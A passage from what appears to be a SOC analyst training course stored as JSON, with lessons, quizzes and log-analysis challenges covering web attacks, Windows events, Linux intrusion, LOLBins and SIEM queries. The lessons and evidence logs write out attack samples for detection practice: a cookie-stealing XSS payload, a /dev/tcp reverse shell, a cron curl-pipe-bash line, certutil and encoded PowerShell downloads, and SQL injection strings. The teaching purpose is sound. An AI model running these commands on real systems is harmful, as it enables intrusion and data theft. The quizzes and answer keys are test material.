it?","h":["1in5w48i9hs"],"hint":""},{"p":"Registered domain the link really leads to (not the subdomain)","h":["1qft1rbj506","15m56ap5fn7"],"hint":""},{"p":"What makes the attachment name suspicious? Name the trick","h":["vn035o1mxq","1lml5xk25jr","1fm7lra4rz0"],"hint":"Two words"}]}},{"title":"Attacks in the access log","module":"Web security monitoring","goal":"Spot SQL injection, XSS, path traversal and brute force in web logs, and judge whether the attack worked.","tasks":[["thm","TryHackMe SOC Level 1: module \"Web Security Monitoring\"",5],["pwn","pwn.college, Intro to Cybersecurity, module \"Web Security\": first 8 challenges (path traversal, command injection, SQL injection)",2.5]],"lesson":"\u003cp>You will defend web apps better once you have attacked one, which is why this week pairs THM log analysis with pwn.college exploitation of the same bug classes.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>Access log fields\u003c/b>: client IP, time, request line, status, size, referrer, user agent.\u003c/li>\n\u003cli>\u003cb>Status codes\u003c/b>: 200 OK, 301/302 redirect, 401 not authenticated, 403 forbidden, 404 not found, 500 server error.\u003c/li>\n\u003cli>\u003cb>SQL injection\u003c/b>: \u003ccode>' OR 1=1--\u003c/code>, \u003ccode>UNION SELECT\u003c/code>, often URL-encoded (%27 is a quote, %20 a space).\u003c/li>\n\u003cli>\u003cb>XSS\u003c/b>: \u003ccode>&lt;script&gt;\u003c/code>, \u003ccode>onerror=\u003c/code>, \u003ccode>document.cookie\u003c/code> in a parameter.\u003c/li>\n\u003cli>\u003cb>Path traversal\u003c/b>: \u003ccode>../../etc/passwd\u003c/code>, or encoded \u003ccode>..%2f\u003c/code>.\u003c/li>\n\u003cli>\u003cb>Brute force\u003c/b>: many POST /login from one IP with 401, then a 200 or 302.\u003c/li>\u003c/ul>\n\u003ch4>Cheat sheet\u003c/h4>\n\u003cpre>awk '{print $1}' access.log | sort | uniq -c | sort -nr | head     top client IPs\nawk '$9==401' access.log | awk '{print $1}' | sort | uniq -c       failed logins per IP\ngrep -Ei \"union|select|%27|\\.\\./|&lt;script\" access.log             attack strings\nawk '{print $9}' access.log | sort | uniq -c                        status code spread\u003c/pre>\n\u003ch4>Did it work?\u003c/h4>\u003cp>Look at status and size. A 200 with a much larger response than normal, or a 500 followed by a 200, suggests the injection returned data. A wall of 403 or 404 suggests it was blocked or missed.\u003c/p>","quiz":[{"q":"What is the difference between HTTP 401 and 403?","o":["None","401 means not authenticated; 403 means authenticated or identified but not allowed","401 is a server error","403 means the page does not exist"],"a":1,"why":"401 asks for credentials. 403 refuses regardless of credentials."},{"q":"A request contains id=1%27%20OR%20%271%27=%271. What is being attempted?","o":["XSS","SQL injection","Path traversal","CSRF"],"a":1,"why":"Decoded: id=1' OR '1'='1, a classic always-true SQL condition."},{"q":"A comment field value of \u003cscript>fetch(\"//x.example/?c=\"+document.cookie)\u003c/script> is an attempt at what?","o":["Command injection","Cross-site scripting to steal cookies","SQL injection","Brute force"],"a":1,"why":"Injected JavaScript running in other users' browsers and sending their cookies out."},{"q":"Which log pattern indicates a login brute-force attack?","o":["One GET / per minute","Dozens of POST /login from one IP with status 401 within seconds","A single 404","Many 304 responses"],"a":1,"why":"High rate, same endpoint, repeated authentication failures from one source."},{"q":"At which layer does a web application firewall inspect traffic?","o":["Layer 2","Layer 3","Layer 4","Layer 7"],"a":3,"why":"A WAF understands HTTP: URLs, parameters, headers and bodies."},{"q":"What is a request for /download?file=../../../../etc/passwd?","o":["Path traversal","XSS","SSRF","A normal download"],"a":0,"why":"The ../ sequences climb out of the intended directory to read system files."},{"q":"A SQL injection request returns status 200 and a response ten times larger than normal. What does that suggest?","o":["The WAF blocked it","The injection may have succeeded and returned extra data","The server is down","Nothing useful"],"a":1,"why":"Response size is one of the best clues for whether data came back."}],"chal":{"title":"Three attackers, one log","brief":"Copy this access log to a file and analyse it with grep and awk. Three different sources are attacking the shop.","evidence":"# /var/log/apache2/access.log - shop.northwind.example\n10.0.0.15 - - [12/Nov/2026:10:01:44 +0200] \"GET / HTTP/1.1\" 200 8120 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.23 - - [12/Nov/2026:10:02:11 +0200] \"GET /products?id=1 HTTP/1.1\" 200 5123 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n198.51.100.23 - - [12/Nov/2026:10:02:12 +0200] \"GET /products?id=1%27 HTTP/1.1\" 500 612 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n198.51.100.23 - - [12/Nov/2026:10:02:13 +0200] \"GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200 48211 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n198.51.100.23 - - [12/Nov/2026:10:02:15 +0200] \"GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 200 9120 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n10.0.0.22 - - [12/Nov/2026:10:03:02 +0200] \"GET /cart HTTP/1.1\" 200 3310 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)\"\n203.0.113.9 - - [12/Nov/2026:10:04:01 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:01 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:02 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:02 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n10.0.0.15 - - [12/Nov/2026:10:04:02 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n203.0.113.9 - - [12/Nov/2026:10:04:03 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:03 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:04 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:04 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:05 +0200] \"POST /login HTTP/1.1\" 302 0 \"-\" \"python-requests/2.32.3\"\n10.0.0.15 - - [12/Nov/2026:10:04:20 +0200] \"POST /login HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n192.0.2.60 - - [12/Nov/2026:10:06:31 +0200] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 1843 \"-\" \"curl/8.5.0\"\n10.0.0.22 - - [12/Nov/2026:10:07:10 +0200] \"GET /checkout HTTP/1.1\" 200 4410 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)\"","qs":[{"p":"IP performing SQL injection","h":["1fpatp6y2wd"],"hint":""},{"p":"Tool the SQL injection attacker is using","h":["1yimboebnan"],"hint":"One word"},{"p":"How many failed logins did 203.0.113.9 make before getting in?","h":["25i2gekeftp"],"hint":"A number. Careful: another client also failed once"},{"p":"Attack type used by 192.0.2.60","h":["6bolpye8kp","124w1z7fwnx","1hyei00w4o0","2cw7xbz0fpv","ehqx32ooiu"],"hint":""},{"p":"Did the request from 192.0.2.60 succeed, judging by the status code? (yes/no)","h":["194ge77ynxg"],"hint":""}]}},{"title":"Windows tells you everything","module":"Windows security monitoring","goal":"Reconstruct a Windows intrusion from Security, System and Sysmon event IDs without a SIEM.","tasks":[["thm","TryHackMe SOC Level 1: module \"Windows Security Monitoring\"",5.5],["own","On your own Windows PC open Event Viewer, filter Security for 4624 and 4625, and find your last logon and its logon type",0.5],["own","Write the event ID table below from memory on paper, then check it",0.5]],"lesson":"\u003cp>Most corporate endpoints are Windows. A handful of event IDs answer most questions an L1 analyst is asked, so memorise them.\u003c/p>\n\u003ch4>Event IDs to know cold\u003c/h4>\n\u003cpre>Security log\n4624  logon success          4625  logon failure\n4634  logoff                 4648  logon with explicit credentials (runas)\n4672  admin privileges assigned at logon\n4688  process created (needs command-line auditing)\n4720  user created           4726  user deleted\n4728/4732  user added to a global/local security group\n4768  Kerberos TGT requested 4769  Kerberos service ticket requested\n1102  audit log cleared\n\nSystem log\n7045  new service installed\n\nSysmon\n1 process create   3 network connection   11 file create\n13 registry value set   22 DNS query\u003c/pre>\n\u003ch4>Logon types\u003c/h4>\n\u003cpre>2 interactive (keyboard)   3 network (SMB, shares)   4 batch\n5 service   7 unlock   10 RemoteInteractive (RDP)   11 cached\u003c/pre>\n\u003ch4>Persistence spots\u003c/h4>\u003cul>\u003cli>Run keys: \u003ccode>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u003c/code> and the HKLM equivalent\u003c/li>\u003cli>Scheduled tasks, services, Startup folder\u003c/li>\u003c/ul>\n\u003ch4>Common trap\u003c/h4>\u003cp>One 4625 means a typo. Judge by pattern: many failures for one account is brute force; one failure each across many accounts from one source is password spraying.\u003c/p>","quiz":[{"q":"Which Security event ID records a successful logon?","o":["4625","4624","4688","4720"],"a":1,"why":"4624 success, 4625 failure."},{"q":"A 4624 event shows Logon Type 10. How did the user log on?","o":["At the keyboard","Over RDP","As a service","Via a network share"],"a":1,"why":"Type 10 is RemoteInteractive. Type 3 is network, type 2 is local interactive."},{"q":"Which event ID records a new process, when auditing is enabled?","o":["4688","4624","7045","1102"],"a":0,"why":"4688 in the Security log; Sysmon event 1 gives the same with richer detail."},{"q":"What does Sysmon event ID 3 record?","o":["Process creation","A network connection","A registry change","A DNS query"],"a":1,"why":"Sysmon 1 process, 3 network, 11 file create, 13 registry, 22 DNS."},{"q":"Which event ID shows that a user account was created?","o":["4720","4732","4768","4634"],"a":0,"why":"4720 created. 4732 means a member was added to a local group."},{"q":"Which registry key is a common persistence location?","o":["HKLM\\HARDWARE","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","HKCR\\.txt","HKU\\.DEFAULT\\Keyboard Layout"],"a":1,"why":"Values under Run start at every logon of that user."},{"q":"Event 7045 appears in the System log. What happened?","o":["A user logged off","A new service was installed","The firewall was disabled","A file was deleted"],"a":1,"why":"Services are a favourite for persistence and for remote execution tools such as PsExec."}],"chal":{"title":"What happened on SRV-FILE-01?","brief":"These are exported Security events from a file server, in time order. Reconstruct the intrusion.","evidence":"# Security log export, SRV-FILE-01, 2026-11-11\nTime      EventID  Details\n01:12:04  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A (bad password)\n01:12:05  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:05  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:06  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:07  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A\n01:12:09  4624     Account=svc_backup  LogonType=3  Source=10.1.1.50\n01:12:09  4672     Account=svc_backup  Privileges=SeBackupPrivilege, SeDebugPrivilege\n01:13:30  4720     NewAccount=helpdesk2  CreatedBy=svc_backup\n01:13:41  4732     Member=helpdesk2  Group=Administrators  AddedBy=svc_backup\n01:15:02  4624     Account=helpdesk2  LogonType=10  Source=10.1.1.50\n01:19:55  1102     The audit log was cleared. Subject=helpdesk2","qs":[{"p":"Which account was brute-forced?","h":["o8iuui9lp6"],"hint":""},{"p":"Logon type of the attacker's first successful logon","h":["1khvl40f9c"],"hint":"A number"},{"p":"Name of the account the attacker created","h":["psh6grevmv"],"hint":""},{"p":"Which group gave that account its power?","h":["1qkhbdnmes6","28r7n2g22qj","1a34p9wlsgb"],"hint":""},{"p":"How did the attacker log on at 01:15:02? Name the protocol","h":["2181tc3owzz","1c0z8f0ndme","26gt24eac3h","i7l4o67o57"],"hint":""},{"p":"Event ID that shows the attacker covering tracks","h":["1e53qtsdty3"],"hint":""}]}},{"title":"Linux under attack","module":"Linux security monitoring and log scripting","goal":"Investigate a Linux server from the command line: logins, processes, persistence, and fast log slicing with grep, awk and sort.","tasks":[["thm","TryHackMe SOC Level 1: module \"Linux Security Monitoring\"",5],["own","Write a 15-line Bash or Python script that reads an auth.log and prints the top 5 IPs by failed logins. Test it on the challenge data",1.5],["pwn","pwn.college \"Web Security\": 4 more challenges, to keep last week's material alive",1.5]],"lesson":"\u003cp>You finished Linux Luminarium, so the shell itself is not new. This week turns it into an investigation tool.\u003c/p>\n\u003ch4>Where to look\u003c/h4>\n\u003cpre>/var/log/auth.log      SSH, sudo (Debian/Ubuntu; /var/log/secure on RHEL)\n/var/log/syslog        general system messages\njournalctl -u ssh      systemd journal for one service\nlast, lastb            successful and failed logins\n~/.bash_history        what a user typed\n/etc/passwd, /etc/shadow, ~/.ssh/authorized_keys     accounts and keys\u003c/pre>\n\u003ch4>Live triage\u003c/h4>\n\u003cpre>ps auxf                         process tree\nss -tulpn                       listening ports and owning process\nls -la /tmp /dev/shm /var/tmp   world-writable dirs attackers love\ncrontab -l ; ls /etc/cron.*     scheduled persistence\nsystemctl list-units --type=service --state=running\nls -l /proc/PID/exe             the real binary, even if deleted\u003c/pre>\n\u003ch4>Log slicing\u003c/h4>\n\u003cpre>grep \"Failed password\" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr\ngrep \"Accepted\" auth.log\ngrep -c \"Failed password for root\" auth.log\u003c/pre>\n\u003ch4>Red flags\u003c/h4>\u003cul>\u003cli>Failures then \"Accepted\" from the same IP\u003c/li>\u003cli>\u003ccode>curl ... | bash\u003c/code> in cron\u003c/li>\u003cli>\u003ccode>bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1\u003c/code> (reverse shell)\u003c/li>\u003cli>Hidden files in /tmp using near 100% CPU (miner)\u003c/li>\u003c/ul>","quiz":[{"q":"Where does Ubuntu log SSH authentication attempts?","o":["/var/log/secure","/var/log/auth.log","/etc/ssh/log","/var/log/dmesg"],"a":1,"why":"Debian and Ubuntu use auth.log. RHEL-family systems use /var/log/secure."},{"q":"Which command counts failed SSH password attempts?","o":["cat auth.log | head","grep -c \"Failed password\" auth.log","ls -l auth.log","tail -f auth.log"],"a":1,"why":"grep -c prints the number of matching lines."},{"q":"What does this line do: bash -i >& /dev/tcp/203.0.113.4/4444 0>&1","o":["Updates bash","Opens a reverse shell to 203.0.113.4","Tests the network","Lists open ports"],"a":1,"why":"It connects out and attaches an interactive shell to that socket."},{"q":"Which command shows listening ports with the owning process?","o":["ss -tulpn","df -h","whoami","uname -a"],"a":0,"why":"ss -tulpn (or netstat -tulpn on older systems)."},{"q":"Why is an executable running from /tmp or /dev/shm suspicious?","o":["Those directories are read-only","They are world-writable, so attackers drop payloads there","They are encrypted","They hold kernel modules"],"a":1,"why":"Legitimate software rarely executes from temporary, world-writable locations."},{"q":"What does this pipeline output: awk '{print $1}' access.log | sort | uniq -c | sort -nr | head","o":["The last 10 lines","The top client IPs by request count","All 404 errors","The file size"],"a":1,"why":"Field 1 is the client IP; uniq -c counts, sort -nr ranks."},{"q":"A cron entry runs: curl -s http://198.51.100.9/x.sh | bash every 5 minutes. What is its purpose?","o":["Log rotation","Persistence: re-downloading and running attacker code","Time sync","A backup"],"a":1,"why":"Download-and-execute on a schedule keeps the attacker's foothold even if the payload is removed."}],"chal":{"title":"web-prod-02 is slow","brief":"Ops reports 100% CPU on a web server. You were given three extracts. Copy them to a file and work in a terminal.","evidence":"# /var/log/auth.log - web-prod-02\nNov 13 02:11:03 web-prod-02 sshd[1811]: Failed password for root from 45.155.205.99 port 40122 ssh2\nNov 13 02:11:05 web-prod-02 sshd[1811]: Failed password for root from 45.155.205.99 port 40122 ssh2\nNov 13 02:11:08 web-prod-02 sshd[1813]: Failed password for root from 45.155.205.99 port 40130 ssh2\nNov 13 02:11:10 web-prod-02 sshd[1813]: Failed password for invalid user admin from 45.155.205.99 port 40130 ssh2\nNov 13 02:11:13 web-prod-02 sshd[1815]: Failed password for root from 45.155.205.99 port 40144 ssh2\nNov 13 02:11:15 web-prod-02 sshd[1815]: Failed password for invalid user test from 45.155.205.99 port 40144 ssh2\nNov 13 02:11:19 web-prod-02 sshd[1817]: Failed password for root from 45.155.205.99 port 40151 ssh2\nNov 13 02:11:22 web-prod-02 sshd[1817]: Failed password for deploy from 45.155.205.99 port 40151 ssh2\nNov 13 02:11:26 web-prod-02 sshd[1819]: Failed password for root from 45.155.205.99 port 40160 ssh2\nNov 13 02:11:31 web-prod-02 sshd[1821]: Accepted password for deploy from 45.155.205.99 port 40171 ssh2\nNov 13 02:11:31 web-prod-02 sshd[1821]: pam_unix(sshd:session): session opened for user deploy(uid=1001)\nNov 13 02:12:04 web-prod-02 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e\nNov 13 08:30:12 web-prod-02 sshd[2950]: Accepted publickey for ana from 10.0.0.8 port 51812 ssh2\n\n# crontab -l (root)\n*/5 * * * * curl -s http://45.155.205.99/x.sh | bash\n\n# ps aux (extract)\nroot      3120 97.4  3.1  /tmp/.kworker -o pool.minexmr.com:4444 --donate-level 1 --cpu-max-threads-hint 100","qs":[{"p":"Attacker's IP address","h":["ib39utc3ns"],"hint":""},{"p":"How many failed password attempts targeted root?","h":["1qzs2omomdx"],"hint":"Use grep -c"},{"p":"Which account did the attacker log in with?","h":["1s94rhdl1sh"],"hint":""},{"p":"Persistence mechanism used","h":["uke9uwldvh","1v8cebqktcr","d84aj6uwnl","m59w39olf8","rpzal80qgr"],"hint":"One word"},{"p":"What kind of malware is /tmp/.kworker?","h":["nxjcjb5n71","cyycge8pp","1r60z4004lj","1qn0hdg6k9r","1qzv476ohki","1ovc1itheq9","1bklbamzemc","itlbxykltb"],"hint":""}]}},{"title":"Know your enemy's tools","module":"Malware concepts and threat intelligence","goal":"Classify malware by behaviour, recognise living-off-the-land binaries, and enrich an indicator with threat intelligence.","tasks":[["thm","TryHackMe SOC Level 1: module \"Malware Concepts for SOC\"",3],["thm","TryHackMe SOC Level 1: module \"Threat Analysis Tools\"",3],["own","Take three hashes from a public threat report, look them up on VirusTotal, and note family, first-seen date and contacted domains",1]],"lesson":"\u003cp>You do not reverse-engineer malware at L1. You do need to recognise what a process tree is telling you and to enrich an indicator in two minutes.\u003c/p>\n\u003ch4>Malware by goal\u003c/h4>\n\u003cul>\u003cli>\u003cb>Ransomware\u003c/b> encrypts for extortion. \u003cb>Infostealer\u003c/b> grabs credentials and cookies. \u003cb>RAT/backdoor\u003c/b> gives remote control. \u003cb>Loader/dropper\u003c/b> fetches the next stage. \u003cb>Miner\u003c/b> burns CPU. \u003cb>Worm\u003c/b> spreads by itself.\u003c/li>\u003c/ul>\n\u003ch4>Living off the land (LOLBins)\u003c/h4>\n\u003cpre>powershell -enc &lt;base64&gt;        encoded command (Base64 of UTF-16LE text)\ncertutil -urlcache -split -f     downloads a file\nmshta http://...                 runs remote HTA\nrundll32, regsvr32               proxy execution of DLLs and scripts\nbitsadmin /transfer              background download\nwmic process call create         remote or local execution\u003c/pre>\n\u003ch4>Suspicious parent and child\u003c/h4>\u003cp>Office apps (winword, excel, outlook) or browsers spawning cmd, powershell, wscript or mshta. See lolbas-project.github.io for the full list.\u003c/p>\n\u003ch4>Enrichment in 2 minutes\u003c/h4>\n\u003cpre>Hash    VirusTotal (search the hash; do not upload internal files)\nIP      AbuseIPDB, VirusTotal, whois/ASN\nDomain  registration age, passive DNS, urlscan.io\nDecode  echo BASE64 | base64 -d | iconv -f UTF-16LE -t UTF-8\n        or CyberChef: From Base64, then Decode text UTF-16LE\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Zero detections on VirusTotal does not mean clean. Fresh or targeted samples start at zero.\u003c/p>","quiz":[{"q":"What distinguishes a worm from a trojan?","o":["A worm encrypts files","A worm spreads to other systems by itself","A worm needs a macro","There is no difference"],"a":1,"why":"Self-propagation defines a worm. A trojan relies on the user running it."},{"q":"What is a LOLBin?","o":["A leaked credential dump","A legitimate, usually signed system binary abused by attackers","A type of ransomware","A sandbox"],"a":1,"why":"Using built-in tools blends in with normal activity and avoids dropping new files."},{"q":"Why should you search a hash on VirusTotal instead of uploading the file?","o":["Uploading is slower","Uploaded files become available to others, which can leak company data or alert the attacker","Hashes give more detections","VirusTotal rejects files"],"a":1,"why":"Submissions are shared with the community and vendors."},{"q":"What does powershell.exe -enc followed by a long string indicate?","o":["A signed script","A Base64-encoded command, often used to hide intent","A PowerShell update","A remote desktop session"],"a":1,"why":"-enc (EncodedCommand) takes Base64 of UTF-16LE text."},{"q":"What is the difference between static and dynamic malware analysis?","o":["Static runs the sample; dynamic does not","Static inspects without running; dynamic executes it in a sandbox and observes","They are the same","Dynamic only reads strings"],"a":1,"why":"Static: hashes, strings, imports. Dynamic: behaviour while running."},{"q":"Which details help most when enriching a suspicious IP?","o":["Its colour in the SIEM","Reputation reports, owner/ASN, geolocation and passive DNS","The analyst's opinion","Its last octet"],"a":1,"why":"Context about who owns it and what it has done before guides the verdict."},{"q":"A file shows 0 of 70 detections on VirusTotal. What can you conclude?","o":["It is safe","Nothing certain; new or targeted malware often starts undetected","It is definitely malicious","The hash is wrong"],"a":1,"why":"Absence of detections is not evidence of safety. Look at behaviour and context."}],"chal":{"title":"Decode the process tree","brief":"EDR raised \"Office application spawned a shell\". Explain what ran. You will need to decode the PowerShell argument: base64 -d piped to iconv -f UTF-16LE, or CyberChef.","evidence":"# EDR process tree, host MKT-PC-03, user o.ceban, 2026-11-16\n14:07:11  explorer.exe (pid 2210)\n14:07:19   └─ WINWORD.EXE (pid 5120)  \"C:\\Users\\o.ceban\\Downloads\\Offer_Nov.docm\"\n14:07:40       └─ cmd.exe (pid 5388)  /c certutil.exe -urlcache -split -f http://91.92.240.15/a.txt C:\\Users\\Public\\a.exe\n14:07:41           └─ certutil.exe (pid 5402)  -urlcache -split -f http://91.92.240.15/a.txt C:\\Users\\Public\\a.exe\n14:07:58       └─ powershell.exe (pid 5466)  -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AOQAyAC4AMgA0ADAALgAxADUALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=\n14:08:03  a.exe (pid 5510)  C:\\Users\\Public\\a.exe   sha256=9f2c1d7a4be0c35d81aa6f0e7b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e","qs":[{"p":"Which process started the malicious chain?","h":["rat7eg9dln","kpreqvp9a1","992goxdcil","14kh5amgpbb"],"hint":"Process name"},{"p":"Which LOLBin downloaded a.exe?","h":["9jtn4gbpdq","v5vb1678v7"],"hint":""},{"p":"Decode the PowerShell command. Which file does it fetch?","h":["10afo52fe29"],"hint":"File name only"},{"p":"ATT&CK technique ID for downloading tools from an external system (Ingress Tool Transfer)","h":["26kjfmtkpfv"],"hint":"T####"},{"p":"IP address you would hunt for across all other hosts","h":["tq31dmjhc8"],"hint":""}]}},{"title":"The analyst's cockpit","module":"SIEM, EDR and SOAR","goal":"Write basic Splunk SPL and Elastic KQL searches from memory and explain what EDR and SOAR add.","tasks":[["thm","TryHackMe SOC Level 1: module \"Core SOC Solutions\" (EDR, SIEM, Splunk basics, Elastic basics, SOAR)",6],["own","Rewrite five of this week's cheat-sheet searches for a different question (for example failed logons per user instead of per IP)",1]],"lesson":"\u003cp>In a real SOC you live in the SIEM. The SAL1 simulator also expects you to pivot between alerts and log searches under time pressure, so query fluency is worth points.\u003c/p>\n\u003ch4>What each tool does\u003c/h4>\n\u003cul>\u003cli>\u003cb>SIEM\u003c/b>: collects logs, normalises field names, correlates, alerts. Splunk, Elastic, Sentinel.\u003c/li>\n\u003cli>\u003cb>EDR\u003c/b>: records endpoint telemetry (processes, files, network) and can respond, for example isolate a host.\u003c/li>\n\u003cli>\u003cb>SOAR\u003c/b>: runs playbooks automatically: enrich, open ticket, block, notify.\u003c/li>\u003c/ul>\n\u003ch4>Splunk SPL\u003c/h4>\n\u003cpre>index=auth action=failure earliest=-24h\n| stats count by src_ip\n| where count > 5\n| sort -count\n\nindex=win EventCode=4625 | stats dc(user) as users by src_ip | where users > 20\nindex=web status=404 | top limit=5 src_ip\nindex=proxy | timechart span=1h sum(bytes_out) by src_ip\n... | table _time host user CommandLine\n... | dedup src_ip\u003c/pre>\n\u003cp>Filter first (index, time, field=value), transform after the pipe. It is faster and easier to read.\u003c/p>\n\u003ch4>Elastic KQL\u003c/h4>\n\u003cpre>event.code: 4625 and user.name: \"admin\"\nsource.ip: 203.0.113.0/24 and not http.response.status_code: 200\nprocess.parent.name: \"winword.exe\" and process.name: (\"cmd.exe\" or \"powershell.exe\")\nurl.path: *passwd*\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Searching \"all time\". Always set the time window around the alert first, then widen.\u003c/p>","quiz":[{"q":"What is the core job of a SIEM?","o":["Blocking malware on endpoints","Collecting, normalising and correlating logs to produce alerts","Scanning for open ports","Encrypting disks"],"a":1,"why":"A SIEM centralises logs so that events from different sources can be searched and correlated."},{"q":"Which SPL search counts failed logins per source IP?","o":["index=auth action=failure | stats count by src_ip","index=auth | count failure","select count(*) from auth","index=auth action=failure | table"],"a":0,"why":"Filter first, then stats count by the grouping field."},{"q":"Where should index and time filters go in an SPL search?","o":["After the last pipe","At the start, before the first pipe","Inside stats","They are optional and irrelevant"],"a":1,"why":"Early filtering reduces the events every later command has to process."},{"q":"Which KQL finds failed Windows logons for the user admin?","o":["event.code: 4625 and user.name: \"admin\"","EventCode=4625 | user=admin","SELECT * WHERE code=4625","event.code == 4624"],"a":0,"why":"KQL uses field: value with and/or/not."},{"q":"What does EDR give you that classic antivirus does not?","o":["Signature updates","Recorded endpoint telemetry and response actions such as host isolation","A firewall","Email filtering"],"a":1,"why":"EDR lets you see the process tree and act on the host remotely."},{"q":"What is SOAR used for?","o":["Storing passwords","Automating response playbooks such as enrichment and containment","Capturing packets","Writing malware signatures"],"a":1,"why":"Security Orchestration, Automation and Response."},{"q":"What does log normalisation mean in a SIEM?","o":["Deleting old logs","Mapping different log formats to common field names","Compressing logs","Encrypting logs"],"a":1,"why":"Without it, src, source_ip and c-ip would need separate searches."}],"chal":{"title":"Run the search in your head","brief":"No SIEM needed. Read the events and work out what each search would return. Then build the same answers in a terminal with grep and awk to check yourself.","evidence":"# 24 events, 2026-11-15, already parsed by the SIEM\n10:00:03 index=web  src_ip=203.0.113.50 status=404 uri=/admin\n10:00:04 index=web  src_ip=203.0.113.50 status=404 uri=/wp-login.php\n10:00:05 index=web  src_ip=203.0.113.50 status=404 uri=/.env\n10:00:06 index=web  src_ip=203.0.113.50 status=404 uri=/phpmyadmin\n10:00:07 index=web  src_ip=203.0.113.50 status=200 uri=/login\n10:00:20 index=web  src_ip=198.51.100.7 status=200 uri=/\n10:00:41 index=web  src_ip=198.51.100.7 status=404 uri=/favicon.ico\n10:01:02 index=web  src_ip=192.0.2.14 status=200 uri=/pricing\n10:01:15 index=web  src_ip=192.0.2.14 status=404 uri=/old-page\n10:01:16 index=web  src_ip=192.0.2.14 status=404 uri=/old-page/img.png\n10:01:30 index=web  src_ip=203.0.113.50 status=404 uri=/backup.zip\n10:02:00 index=web  src_ip=198.51.100.7 status=200 uri=/contact\n10:03:01 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:02 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:03 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:04 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:05 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:06 index=auth user=admin src_ip=203.0.113.50 action=failure\n10:03:09 index=auth user=admin src_ip=203.0.113.50 action=success\n10:04:10 index=auth user=maria src_ip=192.0.2.14 action=failure\n10:04:25 index=auth user=maria src_ip=192.0.2.14 action=success\n10:05:00 index=auth user=admin src_ip=10.0.0.8 action=failure\n10:05:12 index=auth user=admin src_ip=10.0.0.8 action=success\n10:06:40 index=auth user=ion src_ip=198.51.100.7 action=success","qs":[{"p":"Result of: index=web status=404 | stats count by src_ip | sort -count | head 1  (the IP)","h":["1vvo7gsw31e"],"hint":""},{"p":"Result of: index=auth action=failure user=admin | stats count","h":["2ebodv2t52"],"hint":"A number"},{"p":"Which external IP scanned for hidden paths and then brute-forced admin successfully?","h":["1vvo7gsw31e"],"hint":""},{"p":"SPL command you add after \"| stats count by src_ip\" to keep only rows with count above 5","h":["j7as4i7nfo","17d31lqibwn","2eu4qequ3dp","j2h6tw32nv","1ku2b6lblhd","1sba7wcwv5b"],"hint":"One command"},{"p":"One login came from an internal address and may be the real admin. Which IP?","h":["1yfknkjqeg8"],"hint":""}]}},{"title":"Triage like a professional","module":"Alert triage, reporting and the SOC simulator","goal":"Take an alert from queue to closed with a correct verdict and a report another analyst can act on.","tasks":[["thm","TryHackMe SOC Level 1: module \"SOC Team Internals\" (Alert Triage, Alert Reporting, Workbooks and Lookups, Metrics)",3],["thm","TryHackMe SOC Level 1: module \"SIEM Triage for SOC\"",3],["thm","TryHackMe SOC Simulator: one full scenario, timed. Write a case report for every true positive",2]],"lesson":"\u003cp>Knowledge gets you the verdict. The report gets you the job. SAL1 gives case reports as many points as the whole multiple-choice 